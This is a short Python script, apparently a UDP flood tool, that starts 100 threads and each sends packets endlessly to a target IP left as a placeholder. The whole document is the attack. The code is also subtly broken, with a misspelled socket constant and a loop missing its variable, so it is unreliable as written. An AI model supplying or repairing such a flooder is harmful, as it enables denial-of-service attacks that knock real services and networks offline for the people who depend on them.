
import socket
import threading

ip = "enterhere"
port = 1

def flood():

    s = socket.socket(socket.AFINET, socket.SOCK_DGRAM)

    while True:
        s.sendto(b'Flooding', (ip, port))
        print(f"packet sent to {ip}:{port}")

num_threads = 100

for  in range(num_threads):
    thread = threading.Thread(target=flood)
    thread.start()
